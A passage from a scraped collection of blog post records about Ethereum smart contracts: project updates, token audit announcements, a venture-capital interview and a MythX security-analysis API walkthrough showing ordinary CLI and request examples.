you!Now, on to what we have been up to on development and product design since our last update:We have containerized all of our microservices and we are finishing the set up of our staging environment. We are running Minikube locally to speed up development time and to make sure we all have the right environment to work with.We refactored and optimized our compiler microservice so we are now able to compile any smart contract, after validating all constructor arguments.We implemented WebSockets on both the front-end and backend so users will be able to receive various notifications in-app (For example, status of a contract deployment, updates to a contract, and more).We implemented a mailing service so users will now be able to receive various emails from the application.We finished all desktop wireframes for the full product. Now the front-end team is hard at work applying all the changes that have been made. The wireframes are currently getting styled with the selection picked by you, the community!Furthermore, to keep users safe, we are working on an authentication system where a user will be able to log-in through Gmail, Facebook or another email / password scheme.We are also adding OTP [one-time password] two-factor authentication to add an extra layer of security for our users. In short, this will allow a user to use an application like Google Authenticator to sign-in.Etherparty at TokenFest 2018!Etherparty will be in attendance at this year\u2019s TokenFest conference being held in San Francisco at the Palace of Fine Arts Theatre, Mar. 15\u201316.Be sure to check out our lead developer, Patrick Guay, at the Etherparty booth where he will be unveiling the first ever public demonstration of Etherparty\u2019s upcoming token and crowdfund creator\u200a\u2014\u200aso don\u2019t miss out!Stay ConnectedThanks for reading and feel free to engage us online via Telegram, Twitter, Facebook, or any of our other active online channels, which you can find via our website, etherparty.com.\u2014\u200a\u2014\u200a\u2014Disclaimer:No wording contained herein should be construed as solicitation for investment or financial advice in any regard. Etherparty has no control over secondary uses and therefore cannot accept any responsibility for FUEL tokens utilized for investment, speculative, or for secondary market purposes. Statements in this blog relating to the Company\u2019s future plans and objectives are forward-looking statements. Forward-looking statements are based on numerous assumptions and are subject to all of the risks and uncertainties inherent in the Company\u2019s business, including risks inherent in development.", "responses": ""}, {"title": "FundYourselfNow successfully passes Smart Contract\u00a0Audit!", "author_name": "Katalyse.io", "link": "https://cryptodigestnews.com/fundyourselfnow-succesfully-passes-token-audit-c69b0aef564?source=search_post", "post_date": "Jun 23, 2017", "readtime": "2 min read", "upvotes": "108", "content": "FundYourselfNow successfully passes Smart Contract\u00a0Audit!Katalyse.ioBlockedUnblockFollowFollowingJun 23, 2017We are thrilled to announce the FundYourselfNow token contract was thoroughly audited by Dennis Peterson from New Alchemy and certified to be free of critical errors and serious issues. The audit results are at this link: https://www.fundyourselfnow.com/wp-content/uploads/2017/06/FundYourselfNowAuditFinal.pdfEvery great enterprise needs to be built on a solid foundation. The security of our FYN token contract is a key cornerstone of the ecosystem we are building for entrepreneurs, project helpers and investors. It is therefore with great pleasure we received the detailed audit report from Alchemy Limited LLC. It recognises the smart approach of our developers to retain the tried-and-tested conventions of ECR20 token contracts. The report also commends our effective protection against know ECR20 attacks. We are grateful for the feedback provided and will continue to adhere to the best practices in coding to assure our stakeholders can remain confident in the security of FundYourselfNow tokens\u00a0.The audited code contains many features that will be implemented in the template smart contracts that we will provide for our project creators such as:Ability to set prices based on current time. E.g. a presale price, normal sale price etc;Ability to implement cap on token issued;Ability to implement cap based on ETH collected;Withdrawal of unsold tokens in crowdsale;", "responses": ""}, {"title": "Ethernaut Lvl 13 Gatekeeper 1 Walkthrough: How to calculate smart contract gas consumption (and byte\u00a0masking)", "author_name": "Nicole Zhu", "link": "https://medium.com/coinmonks/ethernaut-lvl-13-gatekeeper-1-walkthrough-how-to-calculate-smart-contract-gas-consumption-and-eb4b042d3009?source=search_post", "post_date": "Sep 4, 2018", "readtime": "5 min read", "upvotes": "38", "content": "Ethernaut Lvl 13 Gatekeeper 1 Walkthrough: How to calculate smart contract gas consumption (and byte\u00a0masking)This is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. We learn key Solidity concepts to solve the puzzles 100% on your\u00a0own.Nicole ZhuBlockedUnblockFollowFollowingSep 4, 2018In this level, you estimate gas and mask your bytes to pass three different gates. The concepts behind Gate 1 is explained here in detail.", "responses": "1"}, {"title": "Qlink publishes its crowd fund smart contract on\u00a0Github", "author_name": "QLC Team", "link": "https://medium.com/@QLC_team/qlink-publishes-its-crowd-fund-smart-contract-on-github-321f8f56de24?source=search_post", "post_date": "Jan 1, 2018", "readtime": "", "upvotes": "122", "content": "Qlink publishes its crowd fund smart contract on\u00a0GithubQLC TeamBlockedUnblockFollowFollowingJan 1, 2018Qlink believes in the community power and open source, it has published its crowd fund smart contract on GitHub. find it at: https://github.com/qlinkDev/ContractsWe encourage everyone to learn the smart contract and provide recommendation/critiquesOur Proof of Critique program is running, please fill in the form here and claim your reward: https://docs.google.com/forms/d/143ZBKG24MbyYlWY2QavdM0yvNdExpcZB5PmO4jShyTs/edit", "responses": ""}, {"title": "Today\u2019s Product Push, Smart Contract and Team\u00a0Update", "author_name": "Crowdholding", "link": "https://medium.com/@crowdholding/todays-product-push-smart-contract-and-team-update-957a44095b5c?source=search_post", "post_date": "Jan 29, 2018", "readtime": "4 min read", "upvotes": "241", "content": "Today\u2019s Product Push, Smart Contract and Team\u00a0UpdateCrowdholdingBlockedUnblockFollowFollowingJan 29, 2018First, we want to thank you for your patience while we\u2019ve been focusing on developing the new Smart Contract. The good news, it\u2019s almost complete. As we discussed, a sound monetary policy will be crucial for a stable Crowdholding economy in the future. As we evolve, the community must approve future changes to make the ecosystem succeed.Lets dive into the details of the upcoming smart contract:The (old) YUP contract\u2019s data storage (that holds, among other things, pre-ICO and crowdsale participant balances) has been retrieved and is in the process of being ported to the new contract\u2019s data storage.After consulting various sources on best security practices for smart contracts, we decided to go ahead with the pull (withdraw) scheme for payments, as opposed to the push (airdrop) one. The implication for our token holders is the following: you will be required to send a zero-value Ether transaction to the new contracts\u2019 address along with a transaction data/message (0x-prefixed alphanumeric string; will be announced). To successfully claim your tokens you should: send the transaction from the same account that you contributed Ethers from; prove you have ownership of the (old) Yupie tokens by making sure they are stored in that same account. Should any of you be unable, for any reason, to comply with these requirements, please reach out to us for additional instructions. By the end of the transition period (to be announced at a later date), all unclaimed tokens will be moved to a separate account and stay there until further notice.Reference: https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-callsToken lock info: pre-ICO participants\u2019 tokens will be locked for 3 months and will be able to be claimed (again, pull/withdraw scheme) upon time lock expiry; advisor & team tokens will be locked for 6 months and will be available gradually after that. Again, if you don\u2019t have access to your original purchase wallet, please contact us.The supply amount of the YUP will be set at 445,000,000 (as voted by the community\u200a\u2014\u200aview the task here).Right now we are completing the adjustability feature attached to our smart contract eco-system to allow a future monetary policy which we will co-create with all of you. Any changes must be voted on and approved by the community, for the community. This will not be the smart contract that holds the YUP, but a system of smart contracts that will communicate with the YUP supply contract.The last feature remaining is the adjustability feature which is almost complete. Directly after this, we will be running a test environment with ourselves, coinhub.io, and a few other smart contract auditing companies for security purposes in case of any flaws. Following a successful test (and audit), we will announce the distribution schedule.MarketingFollowing our successful ICO, we are pushing more affiliations with cryptocurrency media outlets and focusing on creating impeccable, informative content to push our ideology further. Our social media reach is growing daily, along with the amount of Crowdholders.Beyond online marketing, we are making sure to maintain a physical presence. We are holding our 3rd blockchain and cryptocurrency meetup at our Hub on the 8th of February, if you wish to attend you can find all the information here. Also our CMO will be attending and speaking at cryptocurrency events in Saint-Petersburg, Istanbul, Tallinn, Kiev & Prague. On top of that we are proud to announce that two of our team members will be advisors in upcoming ICOs.OnboardingWe decided to provide a way for startups to test out the power of the crowd in generating useful feedback. A project named \u2018Industry Feedback\u2019 has been created. The idea of this project is to showcase the collective intelligence of our community and to introduce businesses to our innovative co-creation approach. We have posted tasks on behalf of 8 blockchain businesses, and Crowdholders have showed amazing results on providing feedback.Since our platform supports other ERC20 tokens, we are looking for a diversity of startups who can make use of these. After reviewing, analyzing and contacting around 50 blockchain-based projects, at least 10 project owners have showed great interest in joining Crowdholding. Since the New Year, we have successfully on boarded three innovative projects (Scanta, ImpromptMe and TravelChain), and many more are on the way.Product and developmentAside from the smart contract implementation, we have also been working on a number of items to improve the overall experience of Crowdholding. These include:General bug fixes (pm Henry on telegram with more bugs if you find any!).allowing larger comments (10,000 chars instead of 3,000) and making the commenting UI more clear.Updated the profile section. Separated the activity page (public) and account (private). Added YUP reward table points to comments.A more dynamic leaderboard (monthly top users).Performance improvements.We can see an improvement in our metrics over the last 6 weeks:Total amount of users has increased by 1000Total active users have doubledReturning users have also doubledAmount of tasks have increase threefold.We are very excited about the upcoming months and we will constantly update you on everything. We\u2019re stronger with the Crowd!You can keep up to date with what\u2019s happening at Crowdholding by following us at Facebook, or chatting with us on telegram.", "responses": ""}, {"title": "Updates\u200a\u2014\u200aChronoLogic\u2019s Early DApp, Ethereum Alarm Clock, Debt smart-contract, Team addition, and\u00a0more!", "author_name": "ChronoLogic", "link": "https://blog.chronologic.network/updates-chronos-ethereum-alarm-clock-debt-smart-contract-team-addition-and-more-c5bf0a8dad47?source=search_post", "post_date": "Jan 12, 2018", "readtime": "2 min read", "upvotes": "92", "content": "Updates\u200a\u2014\u200aChronoLogic\u2019s Early DApp, Ethereum Alarm Clock, Debt smart-contract, Team addition, and\u00a0more!ChronoLogicBlockedUnblockFollowFollowingJan 12, 2018This year\u2019s first week has proven itself really fruitful for the whole development of the ChronoLogic technology. And, in order to talk about all this in the length these profound new updates require we\u2019ll be hosting a webinar on January 12th at 1 P.M. EST.Register to this coming webinar while you can: https://register.gotowebinar.com/register/1557414628207662849Let\u2019s now summarize what we\u2019ll discuss on this coming webinar and get you some new and exciting developments.The ChronoLogic\u2019s Early\u00a0dAppOnly 3 months later we are proud to present a testnet functional early version of the ChronoLogic\u2019s dApp, the first of many iterations that we plan to have in the coming months/years.At this moment, you are able to deploy your own testnet version of the DAY token entirely for free. What are you waiting for? Click here and check a tutorial on the matter!Ethereum Alarm\u00a0ClockOne of the early developments that has been counting with ChronoLogic support so far is the Ethereum Alarm Clock. Originally devised by Piper Merrian, the Ethereum Alarm Clock brings something very antecipated and expected by the community, means to schedule and send transactions using the Ethereum Network.For a better understanding of the technology and also getting to know where we\u2019re with it, please check out this blog article.Debt smart-contractThe Debt smart-contracts will certainly be the future of finance, lending, and, of course, will also be present on coming versions of the ChronoLogic\u2019s Early DApp. Just so you know, guess what will be our next addition to this awesome project.Team AdditionAfter having Anthony added to our team, it\u2019s our pleasure to announce Piotr! Coming from a really heavy technical background, Piotr\u2019s mission within ChronoLogic will be to manage and leading a good portion of our team straight to success! If you want to know more about Piotr, please check out this article.And additionally we have so much more to share. So, come to our webinar this Friday and witness revolution of time on the blockchain!", "responses": "2"}, {"title": "[Video Tutorial Series] Episode 1\u2014 How to Deploy Smart Contracts on\u00a0GoChain", "author_name": "GoChainGo", "link": "https://medium.com/@gochaingo/video-tutorial-series-episode-1-how-to-deploy-smart-contract-on-gochain-d13f5302b4da?source=search_post", "post_date": "Sep 26, 2018", "readtime": "", "upvotes": "457", "content": "[Video Tutorial Series] Episode 1\u2014 How to Deploy Smart Contracts on\u00a0GoChainGoChainGoBlockedUnblockFollowFollowingSep 26, 2018Welcome to the GoChain technical video series! Whether your a professional blockchain developer or have never heard of a smart contract, GoChain is here to show you how quick, easy and efficient developing on our protocol can be. We invite you to join us on our technical journey\u200a\u2014\u200awe will be posting tutorial videos as often as we can. This week:Episode 1 - How to Deploy Smart Contracts on\u00a0GoChainA lot of people ask \u201cHow do I deploy my Ethereum smart contract to GoChain?\u201d and the answer is the same way you deploy to Ethereum, just point to a different network. But to make that clear and show how simple it is, here we cover how to deploy a simple solidity contract on GoChain vs. Ethereum:If you find these videos interested or useful, please let us know upcoming topics you\u2019d like us to cover in our Telegram!", "responses": ""}, {"title": "ARAW Token Smart Contract has been successfully audited by CoinMercenary", "author_name": "The ARAW Token", "link": "https://medium.com/@TheARAWToken/araw-token-has-been-successfully-audited-by-coinmercenary-5cfde99b7773?source=search_post", "post_date": "Jun 21, 2018", "readtime": "", "upvotes": "210", "content": "ARAW Token Smart Contract has been successfully audited by CoinMercenaryThe ARAW TokenBlockedUnblockFollowFollowingJun 21, 2018The Smart Contract Audit provider CoinMercenary has been mandated to audit our ARAW token smart contract. Complete smart contract audit report can be found on Github\u200a\u2014\u200ahttps://github.com/arawtoken/arawtokenThis security audit brought more confidence to our potential partners and reveals the quality and the seriousness of the project. The final audit result here below\u00a0:ConclusionThe reviewed smart contracts are free of security issues and well crafted.The effort the ARAW team has put into reviewing the security of their contracts shows their commitment to security.We look forward to seeing the success of the ARAW team and appreciate the opportunity to be a part of their story.Website: https://arawtoken.ioTelegram: https://t.me/ArawTokenOfficialTwitter: https://twitter.com/arawtokenFacebook: https://www.facebook.com/arawtokenLinkedIn: https://www.linkedin.com/company/arawtoken", "responses": ""}, {"title": "Tushar Jain on the \u2018Smart Contract Platform Wars\u2019 in Blockchain", "author_name": "ConsenSys", "link": "https://media.consensys.net/tushar-jain-on-ethereum-chain-maximalism-and-investment-strategy-96db33d729e2?source=search_post", "post_date": "Apr 11", "readtime": "8 min read", "upvotes": "163", "content": "Tushar Jain on the \u2018Smart Contract Platform Wars\u2019 in BlockchainIn advance of appearing at Ethereal Summit NY, the Multicoin Capital Co-Founder discusses his take on blockchain in\u00a02019ConsenSysBlockedUnblockFollowFollowingApr 11In the fast-maturing world of blockchain and cryptocurrency venture capital, Multicoin Capital stands out for both the breadth and quality of the projects in which it invests. The Multicoin portfolio includes decentralized network Dfinity in addition to a number of remarkable Ethereum infrastructural projects like SKALE, KeepKey, and Livepeer, and has lead by example in creating a vibrant, interoperable, and sustainable blockchain future.In doing so, Multicoin Managing Partner Tushar Jain\u200a\u2014\u200aalongside partner Kyle Samani\u200a\u2014\u200ahas established himself as an outspoken advocate for the smart contract platform ecosystem, a keen critic of Ethereum development, and a savvy VC operator in volatile cryptocurrency markets.In anticipation of Tushar\u2019s appearance at Ethereal Summit NY, this May 10\u201311th at Pioneer Works in Brooklyn, we spoke with the Multicoin Co-Founder about the state of Ethereum, the fast-growing smart contract platform market, and the trade-offs inherent in a commitment to decentralization in the burgeoning blockchain industry\u2026Multicoin\u2019s investments include some of the most promising projects in blockchain. What is the strategy?Our mission is to invest in projects that help accelerate the transition from the industrial age to the informational or internet age for the global economy. We want to invest in products that help people better coordinate economic activity. What I like is decentralized networks that allow you to do something that was not possible before\u200a\u2014\u200awhether that\u2019s smart contracts that enable de-fi apps, or if that is a peer-to-peer global telecom network, a social network that is owned by its users. Those are all things that are interesting to me.When I saw Ethereum, I saw not just a new type of peer-to-peer electronic cash, but a new way for human beings to coordinate economic activity with each other. It reminded me of the advent of the joint stock corporation and the Dutch East India Company in the Netherlands in the late 1400s. Before that, businesses just couldn\u2019t get that big. That idea helped enable the creation of the entity of a corporation, which underpins the vast majority of global economic activity now. I think that Ethereum is the first next type of organization. Our mission is to help make that happen as quickly as possible.The smart contract platform market is growing. How do you view the competitive field?I am the furthest thing from a maximalist that you will ever find. I think of everything in probabilities. I don\u2019t think of anything as for certain. I think there is some probability that Ethereum is the winning chain. I don\u2019t think it\u2019s 100 or 0, but it\u2019s in between. There\u2019s some probability that any of these smart contract platforms end up being the dominant platform.I think being a maximalist requires suspending your logic, suspending your ability to think objectively in order to provide yourself with some psychological safety. I can understand why some people would want that. This is a scary world we live in! But for the people who are really seeking truth in their beliefs, it\u2019s very obvious that maximalism is less than ideal.How do you see the blockchain space playing out in this\u00a0regard?It depends on the timeframe. From here, I think the world will first get more heterogenous and we\u2019ll see more divergence in the next 3\u20135 years as more chains come to market that offer different value propositions, that have different go-to-market strategies. There\u2019s going to be a tremendous amount of activity. However, there are really powerful network effects in blockchain tech. In the longer run, I think we\u2019ll see the world come back to homogeneity when it comes to these platforms, and we\u2019ll see convergence into what will most likely be a power-law distribution of market share.The beauty of our investment philosophy is that we look at this as venture capital economics with public market liquidity. We\u2019re looking at the world as it may look ten years out\u200a\u2014\u200athat\u2019s what we\u2019re keeping our eye on. However, we\u2019re able to incorporate new information into our portfolio construction as it becomes available. While we\u2019re investing with a view on the world in ten years, as we get new information in, say, two years, we might change that portfolio composition in order to accommodate.You spoke with Fred Wilson at the Multicoin Summit in October where was critical of Ethereum\u2019s development. What\u2019s your take on his comments and how things have gone since\u00a0then?I\u2019ve been following it pretty closely, and I think it\u2019s a really important conversation for the Ethereum and broader crypto community to be having. To take a step back: There\u2019s a really important tradeoff that different communities in this space need to explore and choose where they want to fit in. The trade-off is between being a bit more centralized and agile versus being more decentralized and open, but losing some agility. I think that there\u2019s a valid view that Ethereum has chosen, which is really focusing on decentralization, and that has come with some costs as it comes to agility and ability to deliver a product that their customers\u200a\u2014\u200awhich is really developers\u200a\u2014\u200awant.I think Fred\u2019s criticisms are well founded, but I don\u2019t think this is a surprise. The Ethereum community and Vitalik chose this tradeoff knowingly and were conscious of this, and knew what they were getting into. I think there\u2019s a possibility that Ethereum decentralized too quickly, and should have remained a little more centralized in this early stage. It\u2019s a perfectly valid choice that the Ethereum community has made. By decentralizing, they\u2019ve gained other things, such as having the largest community and the most developers of any smart contract platform.Join the conversation when Ethereal Summit NY takes place at Pioneer Works in Brooklyn, May\u00a010\u201311th.Which aspects of the Web3 Stack are you most excited\u00a0about?I think that open finance is the most advanced, and is what I\u2019m most excited about. Programmatic value transfer and all these new financial products are actually enabling something that was not possible before. There are pieces of Web3 that are very interesting in the longer run\u200a\u2014\u200adecentralized file storage, hosting of user driven applications\u200a\u2014\u200abut I think those are further away.You recently said \u2018assets become money as they are used as money.\u2019 Can you explain a little more about\u00a0that?That quote is in relation to a thesis I have about Ether or the native token of a smart contract platform becoming a store of value. Let\u2019s talk about Ethereum specifically for now: Let\u2019s say there\u2019s a lot of De-Fi or Web3 apps built on Ethereum, and I\u2019m using Ether to pay for gas, and I\u2019m buying the ability to transact in virtual goods by using Ether, then that makes Ether more of a money-like object. It reinforces the story of Ether being money in our primate brains. The more we tell each other the story that Ether is money, the more the believe that Ether is money. And then, it becomes money. By becoming money, there\u2019s a strong network effect. I think that the smart contract platform that drives the most utility and has its token used as money within the ecosystem that it creates, is most likely to become global, state-free digital money.Are there any projects that have impressed you so far in\u00a02019?In the Ethereum world there are a few projects that I\u2019ve been very impressed by. One is Aztec Protocol. They provide a privacy layer on top of Ethereum. It\u2019s live on Mainnet already. It works. It\u2019s a bit expensive right now in order to send a transaction right now, but that price is coming down. What this means is that we have privacy on Ethereum, and you don\u2019t need to go to another chain in order to get it. I do think that privacy is likely going to end up being a feature, not a product. Something that Aztec Protocol is really interesting, because it enables that. Users should be able to get privacy on the smart contract platform upon which they\u2019re already transacting.What\u2019s your bird\u2019s eye take on where Ethereum is at right\u00a0now?I still think that Ethereum is one of the most amazing things that humanity has ever created. It\u2019s the confluence of so many mind-blowing technological achievements. First, you need to have computers that are networked with each other and communicate in real time effectively all around the world. It\u2019s an entirely internet native thing. Second, you need to have this social consensus layer of governance. I\u2019m very impressed by the story that the community has been able to build around Ethereum.Third, I think the products that can be built on top of Ethereum, the trust-minimized transactions, are simply mind-blowing. It\u2019s stuff that 20\u201330 years ago, would have been totally alien. I think that the global economy has not yet realized how big of an innovation that is, and I think it\u2019s going to reshape commerce as we know it. Whether it\u2019s Ethereum or another smart contract platforms that wins, by being first and by creating this, the Ethereum founders have created what is one of the modern wonders of the world.What do you plan to bring to the discussion at Ethereal Summit\u00a0NY?One topic we\u2019re going to talk about it value capture mechanisms at Layer One versus Layer Two, and the trade-offs. I\u2019m on a panel with a number of Layer Two advocates, and will likely assume the role of Layer Two skeptic. I\u2019ll talk a little about the security model weaknesses, the user experience weaknesses of Layer Two. Although, we are investors in Layer Two projects, and think there\u2019s a real chance that they\u2019re going to create tremendous value, I try to approach everything with a skeptic\u2019s mind. That\u2019s one of the things that I\u2019m most excited to talk about at Ethereal, and help educate the audience about both sides.I\u2019m also on another panel talking about the value capture mechanics in various projects. We actually published a post recently on our blog on the subject. That\u2019s going to be interesting to talk about as well. I want to have deep, interesting conversations with people who are open minded, and have the context to have these conversations. This isn\u2019t a conversation that\u2019s meant for mainstream consumption, for people who don\u2019t think, live, and breathe this stuff every day.by Jemayel Khawaja", "responses": ""}, {"title": "A Deep Dive into the MythX Smart Contract Security Analysis\u00a0API", "author_name": "Bernhard Mueller", "link": "https://hackernoon.com/a-deep-dive-into-the-mythx-smart-contract-security-analysis-api-3c2cd8e6a338?source=search_post", "post_date": "Apr 20", "readtime": "8 min read", "upvotes": "189", "content": "A Deep Dive into the MythX Smart Contract Security Analysis\u00a0APIBernhard MuellerBlockedUnblockFollowFollowingApr 20This week, we launched five challenges as part of the Ethereal Virtual Hackathon with a prize pool of $6k (paid in crypto, obviously). This quick guide explains how to perform an analysis with MythX API.What is\u00a0MythX?MythX is a security analysis platform for Ethereum smart contracts. It performs a comprehensive range of industry-leading analyses on smart contracts, including input fuzzing, static and symbolic analysis.The goal of MythX is to make security analysis available to all Ethereum developers\u200a\u2014\u200aeven those who are not security-savvy. In the ongoing Hackathon we award prizes in five categories. For more details on the requirements and prizes check out the Gitcoin issues:Foundational ToolsContinuous Integration ToolsIDEs and Code EditorsWeb appsFreestyleHow MythX API\u00a0worksMythX clients submit Solidity code and solc compiler artifacts to the MythX API (https://api.mythx.io) for analysis. The required imput data can be generated by compiling source code with solc or solc-js. Prerequisite for analysis is that the code is free of syntax errors and compiles successfully. On submitting the request, the analysis service returns an UUID which can then be used to query the analysis status and obtain the results.The MythX OpenAPI specification describes the API request and response format in detail. However, the easiest way to get familiar with the API is by trying it yourself.Analysis WalkthroughIn the following walkthrough we\u2019ll use PythX, a Python library that also comes with a simple command line interface (if you\u2019re a JavaScript fan and/or Python hater, you can get similar results by running Sabre with the--debug flag). The first step is to install PythX:$ pip3 install pythxYou can show the available commands by running pythx --help.$ pythx --helpUsage: pythx [OPTIONS] COMMAND [ARGS]...PythX is a CLI/library for the MythX smart contract security analysis API.Options:  --help  Show this message and exit.Commands:  check    Submit a new analysis job based on source code, byte code, or...  login    Login to your MythX account  logout   Log out of your MythX account  openapi  Get the OpenAPI spec in HTML or YAML format  ps       Get a greppable overview of submitted analyses  refresh  Refresh your MythX API token  report   Check the detected issues of a finished analysis job  status   Get the status of an analysis by its UUID  top      Display the most recent analysis jobs and their status  truffle  Submit a Truffle project to MythX  version  Print version information of PythX and the APINote that Pythx\u2019s commands closely mirror the API specification: There\u2019s separate commands for login, refresh, submitting an analysis, and so on. Setting the PYTHX_DEBUG environment variable enables verbose debugging output. We\u2019ll use this to get a closer look at the low-level API requests.$ export PYTHX_DEBUG=1AuthenticationMythX API uses username/password authentication based on JSON Web Tokens (JWT). Users are identified by their Ethereum address and a password chosen when signing up.To get started as a MythX developer I recommend signing up for a free account on the MythX website. During the beta, which will run at least until the start of June, free accounts are unrestricted, and we\u2019ll provide special accounts to tool devs once paid subscriptions become available.To accommodate users who want to try out MythX tools prior to signing up, there is also a built-in trial account with limited capabilities. Specifically, the trial user only receives up to three security issues detected per analysis and cannot list or access historical analyses. The credentials for the trial user are:Username: 0x0000000000000000000000000000000000000000Password: trialTo view the login request, type:$ pythx loginThis will prompt you for an Ethereum address and password. PythX will then send a POST request to the /auth/login endpoint:POST https://api.mythx.io/v1/auth/login HTTP/1.1Content-Length: 90Content-Type: application/json{\"ethAddress\": \"0x[...]\", \"password\": \"[password]\"}If the credentials are valid, the server sends a JSON-formatted response containing the JWT access token and refresh token. By submitting the access token in the Bearer header you can use authenticated endpoints. The access token is valid for 10 minutes, after which you can obtain a new one using the refresh token.Running an AnalysisWhile MythX can run an analysis on EVM bytecode only, you have to submit both the source code and bytecode to receive a complete result. The following options exist:Submit bytecode only. In this case, you need to submit both the creation bytecode and runtime bytecode in thebytecode and deployedBytecode fields, respectively. Note that in this case, you will only receive partial results and the false positive rate will be higher.Submit bytecode and Solidity code. Here, you submit the creation and runtime bytecode as well as the source mappings generated by solc. Additionally, you submit a the list of input filenames in the sourceList field and the source code for each file in the sources field. Note that you must include the filenames and code for all imports (and recursively for imports of imports) as well. Finally, when submitting source code, you must add a mainSource field that tells MythX about the primary file being analyzed.Submit bytecode and ASTs. Same as above, but you submit the abstract syntax tree (AST) of each file instead of the source code. Assuming you are using solc, this is easier to implement than option 2 because solc provides the ASTs for all imports automatically\u200a\u2014\u200ayou can simply pass on the output of solc instead of manually adding the source code for each import. Also, the mainSource field can be ommitted when using ASTs.As an example, let\u2019s look at the first challenge of the MythX workshop. To perform an analysis from Solidity source with PythX, make sure you that solc is installed an in the path, then run:$ pythx check -sf Token.solWhat PythX does is running the solc command line tool with the following arguments:solc --combined-json ast,bin,bin-runtime,srcmap,srcmap-runtime <file>It then formats the API request according to specification and sends a POST request to the analysis endpoint. The submitted JSON object looks as follows (truncated for brevity):POST https://api.mythx.io/v1/analysesAuthorization: Bearer [Access token]Content-Length: 18124Content-Type: application/json{  \"data\": {    \"bytecode\": \"[token.sol creation bytecode]\",    \"sourceMap\": \"25:503:0:...\",    \"deployedBytecode\": \"[token.sol bytecode]\",    \"deployedSourceMap\": \"25:503:0:...\",    \"mainSource\": \"token.sol\",    \"sources\": {      \"token.sol\": {        \"ast\": {},        \"source\": \"[Soldity code for token.sol]\"      }    },    \"sourceList\": [      \"token.sol\"    ],    \"version\": \"0.5.7+commit.6da8b019.Linux.g++\",    \"analysisMode\": \"quick\"  },  \"clientToolName\": \"pythx\"}Note the two additional configuration parameters:analysisMode: Currently, there are two analysis modes that differ in the execution time available to the fuzzer and symbolic analyzer. The \u201cquick\u201d mode takes 45\u201390 seconds to complete, while the \u201cfull\u201d mode takes 5\u201310 minutes. Full mode allows for a deeper analysis that can discover more bugs, such as bugs that require multiple transactions to execute. We are currently working on a third mode (codename \u201clighting\u201d) that returns a result within a few seconds.clientToolName: This field allows you to pick an arbitrary name for your tool. We track usage of different MythX tools for the purpose of revenue sharing: After paid subscriptions go live, 25% of revenues will be split between tool devs proportional to the number of active of active paying users of each tool.In the response to a newly submitted analysis you will receive a job UUID (allowing you to track analysis progress), as well as some useful meta data. This includes our backend tool versions, a timestamp, the user\u2019s ID, as well as the time the job has been queued and is running. With the status field you are able to track whether your analysis has finished.{  \"apiVersion\": \"v1.4.14\",  \"harveyVersion\": \"0.0.18\",  \"maestroVersion\": \"1.2.10\",  \"maruVersion\": \"0.4.4\",  \"mythrilVersion\": \"0.20.4\",  \"queueTime\": 1488,  \"runTime\": 11572,  \"status\": \"Queued\",  \"submittedAt\": \"2019-04-20T09:22:56.522Z\",  \"submittedBy\": \"5c6d656206d17300110e24d6\",  \"uuid\": \"d257381b-97b0-4fce-9832-7da2f8ca2ebb\"}Note that initially, the analysis status is shown as \u201cqueued\u201d. Each analysis request goes through three phases:Queued: The job has been accepted but not yet picked up by a worker. As long as the API is not overloaded, jobs should remain in \u201cqueued\u201d state for only a few seconds.In progress: The analysis is currently running. In \u201cquick\u201d mode, the analysis should take 45\u201390 seconds to complete.Finished: The analysis is completed and the report can be obtained.PythX displays these objects in a nicer way through its CLI:$ pythx status d257381b-97b0-4fce-9832-7da2f8ca2ebb\u2552\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2564\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2555\u2502 uuid           \u2502 d257381b-97b0-4fce-9832-7da2f8ca2ebb \u2502\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\u2502 apiVersion     \u2502 v1.4.14                              \u2502\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\u2502 mythrilVersion \u2502 0.20.4                               \u2502\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\u2502 maestroVersion \u2502 1.2.10                               \u2502\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\u2502 harveyVersion  \u2502 0.0.18                               \u2502\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\u2502 maruVersion    \u2502 0.4.4              